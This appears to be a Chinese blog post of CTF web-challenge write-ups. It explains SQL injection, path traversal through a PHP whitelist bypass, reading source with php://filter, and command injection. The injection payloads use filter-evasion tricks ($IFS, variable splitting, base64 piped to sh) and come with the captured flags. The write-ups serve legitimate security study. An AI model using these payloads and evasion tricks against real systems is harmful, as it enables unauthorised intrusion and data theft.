---
title: 【随缘更新中】ctf web类解密
date: 2024-11-14
slug: web-ctf
image: cover.png
tag: 
    - CTF
    - 网络安全
    - web
categories: 
    - 网络安全

---

## [极客大挑战 2019]EasySQL

用户名随意，密码：

````sql
' or 1=1;#
````

原理：SQL简单注入

````sql
SELECT * FROM users WHERE username = 'admin' AND password = '用户输入的密码';
#被更改为：
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1;#';
````
`'`结束了密码的输入，`or`新加条件判断，`#`将后面变为注释，因为 `1=1`恒等于true，所以密码判断为真，直接登入成功。

`flag{bfec2c7f-5da3-426b-9736-04ceb6ff2283}`

## [极客大挑战 2019]Havefun

注释中找到了很有意思的东西：

````php
<!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
````

payload:`?cat=dog`

得到flag：`flag{6e7317ce-c4ce-4112-809e-9c88c6d44a83}`

## [HCTF 2018]WarmUp

源码得到`source.php`，访问得到：

````php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
````

分析代码，需要传入一个名为`file`的参数，需满足以下条件：

1. 是字符串

2. 在`whitelist`中

注意`mb_strpos($page . '?', '?')`，它负责以`?`分割出文件名，来判断是否在`whitelist`中，所以?后可以随便写。

只要满足条件，`include $_REQUEST['file'];`就可以被执行，显示file传入的文件。

通过访问`/hint.php`得到：

`flag not here, and flag in ffffllllaaaagggg`

payload:`/source.php?file=source.php?/../../../../ffffllllaaaagggg`

基于以上，在多次跳转上一目录后，得到了flag：

`flag{5026a355-8b4e-4d00-8f08-a71a732e854c}`

## Linux命令执行(下面几道题道题的前置知识)

[参考](https://www.freebuf.com/articles/web/293411.html)

1）`||` 符号 当前一条命令执行结果为false 就执行下一条命令

2）`|` 符号 只执行 | 符号后面的命令

3）`&&` 符号 当前一条命令执行结果为true 就执行下一条命令

4）`&` 符号 只执行 & 符号后面的命令

5）`;` 符号 不管前一条命令执行的结果是什么，执行下一条命令

6）a=l;b=s;$a$b        //变量覆盖

7）` \echo d2hvYW1p | base64 -d `     echo d2hvYW1p | base64 -d | bash         //base64绕过

8）w`saaaddd8450`ho`762aseba2`am`f0j71`i      wh$(caigou)oa$(anquan)mi       666`whoami`666      //反引号加混淆

9）wh$1oami        who$@ami        whoa$*mi       //$1、$@、$*混淆


## [ACTF2020 新生赛]Include

通过名字，猜测需要读取源码，

利用`php伪协议`，payload:`?file=php://filter/read=convert.base64-encode/resource=flag.php`

得到内容base64解密得到：

`echo "Can you find out the flag?";`

`//flag{94c1e2f9-f482-4a77-9d04-fe9740ff2ee6}`

## [ACTF2020 新生赛]Exec

因为Linux可以同时写两个命令：

````bash
命令1|命令2
````

所以可以在ip后面加上其他的命令，比如`ls`，一层一层找，找到了flag：

`flag{86f478de-728b-40dc-aa9e-4be502142f24}`

payload: `127.0.0.1|ls ./../../../flag`

## [GXYCTF2019]Ping Ping Ping

故技重施，被骂了呜呜呜：

````
/?ip=127.0.0.1|cat%20flag.php

/?ip= fxck your space!
````

看来过滤了空格，尝试绕过：

````
$IFS
${IFS}
$IFS$1 
````

尝试直接输出`flag.php`，发现flag也被过滤，所以先尝试读取`index.php`：

payload: `?ip=127.0.0.1|cat$IFS$1index.php`

````php
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
````

让AI分析一遍：

1. 过滤的字符和符号：
代码使用 `preg_match()` 对 IP 地址进行检查，防止特殊字符或符号（如 `|`, `'`, `"`, \\, `(`, `)`, `[`, `]`, `{`, `}`, `/`, `?`, `*`, `<`, `>`, 空格等）被输入。

2. 阻止空格：
如果输入包含空格，程序会拒绝执行并输出 "fxck your space!"。

3. 阻止 bash：
如果输入中包含 "bash"，程序会拒绝并输出 "fxck your bash!"。

4. 阻止 flag：
如果输入中包含 "flag"，程序会拒绝并输出 "fxck your flag!"。

方法一：

payload:`/?ip=127.0.0.1;s=ag;d=fl;cat$IFS$1$d$s.php`

原理：变量替换，ag写在前面防止检测

方法二：

payload:`/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh`

原理：cat flag.php进行base64编码，用`sh`执行`echo`命令

方法三：

payload:``/?ip=127.0.0.1;cat$IFS$9`ls` ``

原理：先执行`ls`，再把返回的值传入`cat xxx`

需查看源码才能看到flag（一开始还以为靶机有问题，重启了好几次XDD）

`flag{c397edc5-dc1e-45e1-b1d1-2726fca99f2a}`

## [SUCTF 2019]EasySQL

尝试可得，当输入是不为0的数字时，会输出`Array ( [0] => 1 )`，可猜测这里有一个判断，当为真时继续执行接下来的操作。

查阅wp，大佬们已经纷纷猜测出来了这里的语句：

````sql
select $_GET['query'] || flag from Flag
````

### 方法一

payload:`1;select * ,1`

结合上面的语句，构建出来是这样的：

`select *,1 || flag from Flag`


`1 || flag` 中的 `||` 是一个字符串连接操作符，用于将字符串连接在一起。

`1` 是数字 1，在进行字符串连接时，数据库系统通常会自动将数字转换为字符串类型。
`flag` 是`表 Flag` 中的一个字段/列。

因此，`1 || flag` 的意思是将数字 1 和 flag 列的值连接成一个新的字符串。如果 `flag` 列的值是 `A`，则 `1 || A` 的结果会是字符串 `1A`。

所以总体的意思就是，从`Flag`表中选择所有数据以及由`1`和`flag`组成的字符串，输出：

`Array ( [0] => 1 ) Array ( [0] => flag{6fc12e75-bcc3-4c8d-9bfd-85a2630b9f31} [1] => 1 )`

### 方法二

payload:`1;set sql_mode=PIPES_AS_CONCAT;select 1`

`set sql_mode=PIPES_AS_CONCAT`将 SQL 模式设置为把管道符（|）作为字符串连接运算符。这意味着在查询中使用管道符时，它会被视为连接字符串的操作符，而不是其他默认的含义。这样可以改变某些 SQL 语句的行为以满足特定的需求。

人话就是，把原本判断用法的逻辑运算符改成了连字符用法，输出：
`Array([0]=>1)Array([0]=>1flag{6fc12e75-bcc3-4c8d-9bfd-85a2630b9f31})`